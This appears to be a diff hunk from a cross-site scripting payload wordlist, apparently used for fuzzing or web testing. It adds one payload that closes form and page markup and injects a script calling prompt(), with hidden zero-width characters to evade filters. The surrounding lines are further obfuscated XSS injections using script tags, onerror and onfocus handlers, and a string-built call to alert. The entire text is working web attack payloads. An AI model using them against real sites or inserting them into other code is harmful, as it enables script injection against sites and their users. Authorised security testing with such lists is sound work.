@@ -2707,3 +2707,4 @@ foo<script>alert(1)</script>
 '-alert?.(1)-'
 <img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt
 "><input autofocus a=\" onfocus​='window[al+/e/[ex+ec]e+rt](1)'>
+"></fieldset></form><​script>prompt(/legionhunter/);<​/script></body></html><!--
